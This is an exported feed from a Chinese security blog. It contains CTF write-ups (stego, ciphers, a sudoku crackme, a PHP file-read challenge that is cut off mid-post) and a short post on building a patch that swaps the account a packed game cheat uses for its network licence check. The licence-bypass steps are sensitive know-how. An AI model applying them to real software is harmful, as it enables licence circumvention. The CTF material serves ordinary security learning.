    <title>Snert-2018春季淘汰赛Misc,Crypto WriteUp</title>
    <link href="https://kabeor.github.io/Snert-2018%E6%98%A5%E5%AD%A3%E6%B7%98%E6%B1%B0%E8%B5%9BMisc,Crypto%20WriteUp/"/>
    <id>https://kabeor.github.io/Snert-2018春季淘汰赛Misc,Crypto WriteUp/</id>
    <published>2018-03-18T14:00:17.379Z</published>
    <updated>2018-06-07T11:13:44.744Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Misc100-black"><a href="#Misc100-black" class="headerlink" title="Misc100 black"></a>Misc100 black</h1><p>给了张图，估计隐写<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180318/cJKLGDA02e.png?imageslim" alt="mark"></p><p>掏出神器StegSolve<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180318/BKJfBACC68.png?imageslim" alt="mark"><br>点下面的箭头到Random color就看见了<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180318/2E1kg49lIc.png?imageslim" alt="mark"></p><h1 id="Misc200-我在哪"><a href="#Misc200-我在哪" class="headerlink" title="Misc200 我在哪"></a>Misc200 我在哪</h1><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180318/gH0JHD728g.png?imageslim" alt="mark"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">12343254634532412342423423412435645756879076845643521343254365756f2423423412435645756879076845643521343254365756242342341243564575687907684564352134325436575624234234124356457568790768456435213432543657562423423412435645756879076845643521343254365756242342341243564575687907684564352134325436575624234234124356457568790768456435213432543657562423423412435645756879076845643521343254365756l24234234124356457568790768456435213432543657562423423412435645756879076845643521343254365756242342341243564575687907684564352134325436575624234234124356457568790768456435213432543657562423423412435645756879076845643521343254365756a024234234124356457568790768456435213432543657561343254365756242134325436575624213432543657562421343254365756242g2423423412435645756879076845643521343254365756242342341243564575687907684564352134325436575624234234124356457568790768456435213432543657562423423412435645756879076845643521343254365756&#123;352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242f3521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242f3521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242f352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242f3521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242f35213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242f35213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242u3521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242c3521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242k3521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242756242352134325436575624235213756242352134325436575624235213756242352134325436575624235213756242352134325436575624235213756242352134325436575624235213_1343254365756242135213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242t352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242h352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242i35213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242s35213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242&#125;3521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624213432543657562421343254365756242</span><br></pre></td></tr></table></figure><p>给了一大堆，但是我从里面看见了f等字母，不想费眼睛，新建word，把数字全部替换为空即可<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180318/18akK7lIKm.png?imageslim" alt="mark"></p><blockquote><p>官方wp<br>用的是脚本</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">str=<span class="string">"xxxxxxxxxx"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> str:</span><br><span class="line">    <span class="keyword">if</span> i.isdigit():</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> i</span><br></pre></td></tr></table></figure><h1 id="Misc300-某人的猫"><a href="#Misc300-某人的猫" class="headerlink" title="Misc300 某人的猫"></a>Misc300 某人的猫</h1><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180318/EEC7GLAD6f.png?imageslim" alt="mark"></p><p>给了个压缩包，winhex看了，并不是伪加密，于是掏出神器Ziperello,设定1到8位纯数字爆破，五秒真男人后就成功了</p><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180318/F612c3aja3.png?imageslim" alt="mark"></p><p>打开txt看看</p><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180318/fA53BIh5k9.png?imageslim" alt="mark"><br>非常的长<br>没有base64的特点，想到了16进制转字符串，试试</p><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180318/fAj7aLdL7i.png?imageslim" alt="mark"><br>乱码了，不过看见了PNG，那肯定是转图片咯<br>使用16进制转图片的软件<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180318/CiIDbjHk1K.png?imageslim" alt="mark"><br>得到一张照片<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180318/KEeDkIkEhK.jpg?imageslim" alt="mark"><br>扫一扫<br>得到<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180318/2dGE1iaFbh.png?imageslim" alt="mark"><br>没什么头绪，放进kali中binwalk一下，中奖了<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180318/3Fjli3Lcj2.png?imageslim" alt="mark"><br>五张，第一张就是那个二维码，其他的用dd命令分离<br><code>dd if=1.jpg of=2.jpg skip=12280 bs=1</code><br>这里if是指定输入文件，of是指定输出文件，skip是指定从输入文件开头跳过12280个块后再开始复制，bs设置每次读写块的大小为1字节.</p><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180318/55f52H7F0K.png?imageslim" alt="mark"><br>最后的flag</p><blockquote><p>官方wp</p><p>千禧年:2000年<br>md5:2adf764239cce9d9052b0670bbbbb455<br>纯考写脚本<br>思路就是md5碰撞去匹配生日，但是考点在如何从12*31个md5中去找到那个被修改了一位之前的<br>md5<br>py中有现成的库difflib 去比较两个字符串的相似程度，所以找出其中相似值最大的就好了</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> difflib</span><br><span class="line">days=[]</span><br><span class="line"><span class="comment"># 生成生日日期</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">13</span>):</span><br><span class="line">    <span class="keyword">if</span> i &lt;=<span class="number">9</span>:</span><br><span class="line">        mounth=<span class="string">'0'</span>+str(i)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        mounth=str(i)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">32</span>):</span><br><span class="line">        <span class="keyword">if</span> j &lt;=<span class="number">9</span>:</span><br><span class="line">            day=<span class="string">'0'</span>+str(j)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            day=str(j)</span><br><span class="line">        birth=<span class="string">'1997'</span>+mounth+day</span><br><span class="line">        days.append(birth)</span><br><span class="line"></span><br><span class="line">code=<span class="string">'2adf764239cce9d9052b0670bbbbb455'</span></span><br><span class="line"></span><br><span class="line">result = &#123;&#125;</span><br><span class="line">ratios = []</span><br><span class="line"></span><br><span class="line"><span class="comment">#碰撞md5，并计算相似值，以字典的形式储存最后读取出相似值最高的值</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> day <span class="keyword">in</span> days:</span><br><span class="line">    md5 = hashlib.md5(day.encode(<span class="string">'utf‐8'</span>)).hexdigest()</span><br><span class="line">    seq = difflib.SequenceMatcher(<span class="keyword">None</span>,md5,code)</span><br><span class="line">    ratio = seq.ratio()</span><br><span class="line">    ratios.append(ratio)</span><br><span class="line">    result[ratio]=day</span><br><span class="line">    <span class="keyword">print</span> ratio,day</span><br><span class="line"></span><br><span class="line">tmax = max(ratios)</span><br><span class="line"><span class="keyword">print</span> tmax</span><br><span class="line"><span class="keyword">print</span> result[tmax]</span><br></pre></td></tr></table></figure><h1 id="Misc200-flag去哪了"><a href="#Misc200-flag去哪了" class="headerlink" title="Misc200 flag去哪了"></a>Misc200 flag去哪了</h1><p>又给了一张图(这张图不会显示)<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180318/7DbLfABIFL.png?imageslim" alt="mark"><br>截图为<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180318/G7GaJ9jdbA.png?imageslim" alt="mark"><br>这回缺了点什么<br>放进linux不识别，应该是修改了16进制的像素位，所以用winhex看看<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180318/heIme582Hf.png?imageslim" alt="mark"></p><p>对于png文件，其第二行第六七列是高度位，改这一位即可，修改时的数值应该从十进制转为16进制<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180318/2BfJhCAcDa.png?imageslim" alt="mark"><br>保存后查看，也只能截图了<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180318/mhmbbeliKE.png?imageslim" alt="mark"><br>那个o是小写。。。</p><h1 id="Crypto100-TAT"><a href="#Crypto100-TAT" class="headerlink" title="Crypto100 TAT"></a>Crypto100 TAT</h1><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180318/JmL3fFKcDJ.png?imageslim" alt="mark"><br>对于这道题我只能说，别百度了，Google吧，颜文字密码，aaencode解密即可<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180318/bIAiid9EfC.png?imageslim" alt="mark"></p><h1 id="Crypto200-仿射密码"><a href="#Crypto200-仿射密码" class="headerlink" title="Crypto200 仿射密码"></a>Crypto200 仿射密码</h1><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180318/J82bddGa35.png?imageslim" alt="mark"></p><p>加法密码和乘法密码结合就构成仿射密码，仿射密码的加密和解密算法是：C= Ek(m)=(k1m+k2) mod n<br>M= Dk(c)=k3(c- k2) mod n（其中（k3 ×k1）mod26 = 1）<br>仿射密码具有可逆性的条件是gcd(k1, n)=1。当k1=1时，仿射密码变为加法密码，当k2=0时，仿射密码变为乘法密码。<br>仿射密码中的密钥空间的大小为nφ(n)，当n为26字母，φ(n)=12，因此仿射密码的密钥空间为12×26 = 312。</p><p>让解密，c++写个程序</p><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180318/J2fH6C106a.png?imageslim" alt="mark"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &quot;stdafx.h&quot;</span><br><span class="line">#include&lt;iostream&gt;</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line">#include &lt;cstdio&gt;</span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">char s[100];</span><br><span class="line">int num[100];</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">while (std::cin &gt;&gt; s)</span><br><span class="line">&#123;</span><br><span class="line">int len = (int)strlen(s);</span><br><span class="line">for (int i = 0; i &lt; len; i++)</span><br><span class="line">&#123;</span><br><span class="line">num[i] = s[i] - &apos;a&apos; + 26;</span><br><span class="line">while ((num[i] - 7) % 11)</span><br><span class="line">&#123;</span><br><span class="line">num[i] += 26;</span><br><span class="line">&#125;</span><br><span class="line">s[i] = (num[i] - 7) / 11 + &apos;a&apos;;</span><br><span class="line">printf(&quot;%c&quot;, s[i]);</span><br><span class="line">&#125;</span><br><span class="line">putchar(&apos;\n&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180318/HdEH6ec7a4.png?imageslim" alt="mark"></p><h1 id="Crypto200-animals"><a href="#Crypto200-animals" class="headerlink" title="Crypto200 animals?"></a>Crypto200 animals?</h1><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180318/jfa5dk94kk.png?imageslim" alt="mark"><br>给了一长串，最后有===，是个base64，于是只能一遍一遍去解了，<br>最后留下一行<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180318/Bkdh8I0fFg.png?imageslim" alt="mark"></p><p>倒过来</p><pre><code>what kind of animal cry wangwang</code></pre><p>会汪汪的只有dog</p><p>所以    flag{dog}</p><blockquote><p>官方wp<br>n次base64</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">str=<span class="string">'xxx'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        a=base64.b64decode(str)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"> <span class="keyword">print</span> a</span><br></pre></td></tr></table></figure><h1 id="Crypto300-真正的粉丝0-0"><a href="#Crypto300-真正的粉丝0-0" class="headerlink" title="Crypto300 真正的粉丝0_0"></a>Crypto300 真正的粉丝0_0</h1><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180318/9J8k3DBdhG.png?imageslim" alt="mark"></p><p>并不知道这是什么梗，还好I have a girlfriend</p><p>所以不知道为什么会有 89 64<br>也不知道为什么最后  flag{tooyoungtoosimple}</p><blockquote><p>官方wp</p></blockquote><p>格朗普雷密码,特点是用一个单词或者句子作为棋盘首行，包含26个英文字母，然后用坐标<br>表示字母<br>提示给了为什么没有9和句子中字母的个数提示，一共64个字母，是8*8 的棋盘，所以没有9<br>从上到下把字母放入棋盘</p><pre><code>  1 2 3 4 5 6 7 81 t h e q u i c k 2 b r o w n f o x3 j u m p s o v e4 r t h e l a z y5 d o g a n d a n6 a i v e g u y w7 a n t t o g e t8 a f l a g l o l</code></pre><p>对应 11 27 87 67 52 66 55 85 73 87 27 35 16 33 34 45 77</p><h2 id="完结"><a href="#完结" class="headerlink" title="完结"></a>完结</h2><p>From <a href="https://kabeor.github.io/Snert-2018春季淘汰赛Misc,Crypto WriteUp/">https://kabeor.github.io/Snert-2018春季淘汰赛Misc,Crypto WriteUp/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Misc100-black&quot;&gt;&lt;a href=&quot;#Misc100-black&quot; class=&quot;headerlink&quot; title=&quot;Misc100 black&quot;&gt;&lt;/a&gt;Misc100 black&lt;/h1&gt;&lt;p&gt;给了张图，估计隐写&lt;br&gt;&lt;img src=&quot;htt
      
    
    </summary>
    
      <category term="密码学和杂项" scheme="https://kabeor.github.io/categories/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%92%8C%E6%9D%82%E9%A1%B9/"/>
    
    
      <category term="密码学" scheme="https://kabeor.github.io/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
      <category term="杂项" scheme="https://kabeor.github.io/tags/%E6%9D%82%E9%A1%B9/"/>
    
      <category term="Misc" scheme="https://kabeor.github.io/tags/Misc/"/>
    
      <category term="Crypto" scheme="https://kabeor.github.io/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>Snert-2018春季淘汰赛Reverse WriteUp</title>
    <link href="https://kabeor.github.io/Snert-2018%E6%98%A5%E5%AD%A3%E6%B7%98%E6%B1%B0%E8%B5%9BReverse%20WriteUp/"/>
    <id>https://kabeor.github.io/Snert-2018春季淘汰赛Reverse WriteUp/</id>
    <published>2018-03-18T11:40:08.013Z</published>
    <updated>2018-03-18T14:38:32.749Z</updated>
    
    <content type="html"><![CDATA[<h1 id="RE100"><a href="#RE100" class="headerlink" title="RE100"></a>RE100</h1><p>这题越看越熟悉，原来做过，i春秋的那篇wp就是我写的hhh</p><p>链接   <a href="https://www.ichunqiu.com/writeup/detail/597" target="_blank" rel="noopener">第三届上海市大学生网络安全大赛crackme</a></p><h1 id="RE500"><a href="#RE500" class="headerlink" title="RE500"></a>RE500</h1><h2 id="查壳"><a href="#查壳" class="headerlink" title="查壳"></a>查壳</h2><p>无壳<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180318/E4901AaAE8.png?imageslim" alt="mark"></p><h2 id="IDA反编译"><a href="#IDA反编译" class="headerlink" title="IDA反编译"></a>IDA反编译</h2><p>运行发现，随意输入会弹出fail，此题应该是算法题，于是拖入IDA，shift+F12搜索字符串fail<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180318/6c3J2568km.png?imageslim" alt="mark"><br>只有一个，于是跟进去<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180318/CgJ1FH8iBh.png?imageslim" alt="mark"><br>发现这里就是主要算法部分了</p><h2 id="算法分析"><a href="#算法分析" class="headerlink" title="算法分析"></a>算法分析</h2><p>这个程序的伪代码竟然是标准的C++</p><p>我们可以明显注意到名称空间Sudu<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180318/ikdI5ACald.png?imageslim" alt="mark"></p><p>黄标可以看出有三个函数，分别是<br><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">Sudu::Sudu</span><br><span class="line">Sudu::set_data</span><br><span class="line">Sudu::check</span><br></pre></td></tr></table></figure></p><p>根据他们的位置判断，这些就是主要函数了</p><h3 id="Sudu-Sudu方法"><a href="#Sudu-Sudu方法" class="headerlink" title="Sudu::Sudu方法"></a>Sudu::Sudu方法</h3><p>进入后看到，这里是用来初始化的，把所有字符初始化为零<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180318/D6KD4FldkB.png?imageslim" alt="mark"></p><h3 id="Sudu-set-data方法"><a href="#Sudu-set-data方法" class="headerlink" title="Sudu::set_data方法"></a>Sudu::set_data方法</h3><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180318/D5cI364BAE.png?imageslim" alt="mark"><br>这里明显是创建一个9x9的表，然后把this中的数字按顺序填进去<br>this就是外面的_data_start__<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180318/gbFl1Ikkf8.png?imageslim" alt="mark"><br>里面数字具体如下（太长了，只截取一部分）<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180318/EK3kDiBKJ7.png?imageslim" alt="mark"><br>按序填入后如下</p><pre><code>0 0 7 5 0 0 0 6 00 2 0 0 1 0 0 0 79 0 0 0 3 0 4 0 02 0 1 0 0 0 0 0 00 3 0 1 0 0 0 0 50 0 0 0 0 0 7 1 04 0 0 0 0 8 2 0 00 0 5 9 0 0 0 8 00 8 0 0 0 1 0 0 3</code></pre><h3 id="Sudu-check方法"><a href="#Sudu-check方法" class="headerlink" title="Sudu::check方法"></a>Sudu::check方法</h3><p>最后来看check这个方法，这个方法是判断决定输出是否成功的，返回1则success，内部如下<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180318/lLa20ilcbe.png?imageslim" alt="mark"><br>又是三个方法分别为<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Sudu::check_block    //块</span><br><span class="line">Sudu::check_col      //列</span><br><span class="line">Sudu::check_row      //行</span><br></pre></td></tr></table></figure></p><p>根据单词意思就很好理解了，它们以&amp;&amp;连接，所以必须同时为1才行</p><h4 id="check-block方法"><a href="#check-block方法" class="headerlink" title="check_block方法"></a>check_block方法</h4><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180318/8miCfll5Hj.png?imageslim" alt="mark"><br>先初始化v2，再对每个3x3的块做遍历，判断是否每个块里的数字各不相同</p><h4 id="check-col方法"><a href="#check-col方法" class="headerlink" title="check_col方法"></a>check_col方法</h4><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180318/LI9Dj888Bi.png?imageslim" alt="mark"><br>检查每列数字是否相同</p><h4 id="check-row方法"><a href="#check-row方法" class="headerlink" title="check_row方法"></a>check_row方法</h4><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180318/Kgbb38DE6I.png?imageslim" alt="mark"><br>同样的，检测每行数字是否相同</p><h2 id="还有一个坑"><a href="#还有一个坑" class="headerlink" title="还有一个坑"></a>还有一个坑</h2><p>我们没有注意到，在if中有个set_sudu函数，进去看看<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180318/j1CB8KjdFL.png?imageslim" alt="mark"></p><p>很长，但我们只需要看主要的if，这里有个Sudu::number方法，再进去<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180318/LgKi2jBg4K.png?imageslim" alt="mark"><br>这里<br>a1是我们要输入的字符串<br>this=v10/9<br>a3=v10%9<br>a4=v8-48<br>a5=v5</p><p>判断表中的值是否为0，把原来给的值全设为0</p><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p>数独太难，直接放网站解<br><a href="http://shudu.gwalker.cn/" target="_blank" rel="noopener">http://shudu.gwalker.cn/</a><br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180318/j3G5A5kkhB.png?imageslim" alt="mark"></p><p>flag{340089102508406930016207058060875349709064820854392006093650071170023604602740590}</p><p>From <a href="https://kabeor.github.io/Snert-2018春季淘汰赛Reverse WriteUp/">https://kabeor.github.io/Snert-2018春季淘汰赛Reverse WriteUp/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;RE100&quot;&gt;&lt;a href=&quot;#RE100&quot; class=&quot;headerlink&quot; title=&quot;RE100&quot;&gt;&lt;/a&gt;RE100&lt;/h1&gt;&lt;p&gt;这题越看越熟悉，原来做过，i春秋的那篇wp就是我写的hhh&lt;/p&gt;
&lt;p&gt;链接   &lt;a href=&quot;https:/
      
    
    </summary>
    
      <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
      <category term="i春秋Reverse赛题" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/i%E6%98%A5%E7%A7%8BReverse%E8%B5%9B%E9%A2%98/"/>
    
    
      <category term="逆向，i春秋" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91%EF%BC%8Ci%E6%98%A5%E7%A7%8B/"/>
    
  </entry>
  
  <entry>
    <title>对新版本的某游戏辅助带vmp制作山寨补丁</title>
    <link href="https://kabeor.github.io/%E5%AF%B9%E6%96%B0%E7%89%88%E6%9C%AC%E7%9A%84%E6%9F%90%E6%B8%B8%E6%88%8F%E8%BE%85%E5%8A%A9%E5%B8%A6vmp%E5%88%B6%E4%BD%9C%E5%B1%B1%E5%AF%A8%E8%A1%A5%E4%B8%81/"/>
    <id>https://kabeor.github.io/对新版本的某游戏辅助带vmp制作山寨补丁/</id>
    <published>2018-03-12T05:22:42.707Z</published>
    <updated>2018-03-13T13:24:07.867Z</updated>
    
    <content type="html"><![CDATA[<h1 id="对新版本的某游戏辅助带vmp制作山寨补丁"><a href="#对新版本的某游戏辅助带vmp制作山寨补丁" class="headerlink" title="对新版本的某游戏辅助带vmp制作山寨补丁"></a>对新版本的某游戏辅助带vmp制作山寨补丁</h1><p>还是上次那人写的辣鸡辅助，这次是最新版的，拿来看看<br>上篇链接<br><a href="https://kabeor.github.io/%E5%AF%B9%E6%9F%90%E6%B8%B8%E6%88%8F%E8%BE%85%E5%8A%A9%E7%9A%84%E7%BD%91%E7%BB%9C%E9%AA%8C%E8%AF%81%E7%A0%B4%E8%A7%A3/">对某游戏辅助的网络验证破解</a></p><h1 id="查壳"><a href="#查壳" class="headerlink" title="查壳"></a>查壳</h1><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180312/9DJ98g3DH9.png?imageslim" alt="mark"></p><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180312/Jl7J5aAKGl.png?imageslim" alt="mark"></p><p>这次加了个vmp的壳，不过我们打补丁就行</p><h1 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h1><p>就不放图了，还是拿sniff抓，还是那人的号，上一篇提过</p><p>这次不采用二进制修改的方法，我们只需要用补丁将易游验证的号换成我们自己的</p><h1 id="补丁制作"><a href="#补丁制作" class="headerlink" title="补丁制作"></a>补丁制作</h1><p>我们使用XH补丁制作工具<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180312/lAm387g3k3.png?imageslim" alt="mark"></p><p>首先我们需要原始的账号，就是下面这个<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180306/GCaLFi43cd.png?imageslim" alt="mark"></p><p>把/后面的那一串转换为16进制，粘贴进原始特征，再把我们自己的也转换为16进制，粘贴进目标数据。</p><p>点击上面Inline Hook，双击CreateWindowExa函数，<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180312/882hbAKkBj.png?imageslim" alt="mark"><br>其他可以自己设置，然后回去点生成补丁即可</p><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180312/gcdcbGIFA8.png?imageslim" alt="mark"></p><h2 id="吐槽"><a href="#吐槽" class="headerlink" title="吐槽"></a>吐槽</h2><p>这辣鸡辅助这回能进去了，进游戏跳伞就封七天，幸亏我不玩这神仙游戏了</p><p>From <a href="https://kabeor.github.io/对新版本的某游戏辅助带vmp制作山寨补丁/">https://kabeor.github.io/对新版本的某游戏辅助带vmp制作山寨补丁/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;对新版本的某游戏辅助带vmp制作山寨补丁&quot;&gt;&lt;a href=&quot;#对新版本的某游戏辅助带vmp制作山寨补丁&quot; class=&quot;headerlink&quot; title=&quot;对新版本的某游戏辅助带vmp制作山寨补丁&quot;&gt;&lt;/a&gt;对新版本的某游戏辅助带vmp制作山寨补丁&lt;/h1&gt;&lt;
      
    
    </summary>
    
      <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="逆向" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91/"/>
    
      <category term="破解" scheme="https://kabeor.github.io/tags/%E7%A0%B4%E8%A7%A3/"/>
    
  </entry>
  
  <entry>
    <title>PCTF2016 Web300神盾局的秘密(反序列化漏洞)</title>
    <link href="https://kabeor.github.io/PCTF2016%20Web300%E7%A5%9E%E7%9B%BE%E5%B1%80%E7%9A%84%E7%A7%98%E5%AF%86(%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E)/"/>
    <id>https://kabeor.github.io/PCTF2016 Web300神盾局的秘密(反序列化漏洞)/</id>
    <published>2018-03-11T08:52:47.572Z</published>
    <updated>2018-06-07T11:13:17.347Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PCTF2016-Web300神盾局的秘密-反序列化漏洞"><a href="#PCTF2016-Web300神盾局的秘密-反序列化漏洞" class="headerlink" title="PCTF2016 Web300神盾局的秘密(反序列化漏洞)"></a>PCTF2016 Web300神盾局的秘密(反序列化漏洞)</h1><p>打开之后是这样的<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180311/ih43CAAgEg.png?imageslim" alt="mark"></p><p>查看网页源代码，只有一行<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180311/4ECC7BiAae.png?imageslim" alt="mark"></p><p>很明显这是base64加密，于是解密看一下<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180311/lbc0FKII7G.png?imageslim" alt="mark"><br>于是看出访问格式为</p><pre><code>showimg.php?img=文件名的base64</code></pre><p>得到格式之后，先看showimg.php，base64加密访问<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180311/mIa4jG021C.png?imageslim" alt="mark"><br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180311/7mcDCAJJ5H.png?imageslim" alt="mark"><br>可以看出，这里过滤掉了一些特殊字符以及pctf字符串。</p><p>我们再来看看index.php，把它base64加密<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180311/G0EK0Kh95b.png?imageslim" alt="mark"></p><p>然后访问，查看源代码<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180311/HE1l714B3b.png?imageslim" alt="mark"><br>我们看到<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require_once</span>(<span class="string">'shield.php'</span>);</span><br></pre></td></tr></table></figure></p><blockquote><p>require_once语句在脚本执行期间包含并运行指定文件。</p></blockquote><p>于是我们需要访问shield.php,再次base64加密访问<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180311/mHbBhaD6jj.png?imageslim" alt="mark"><br><img 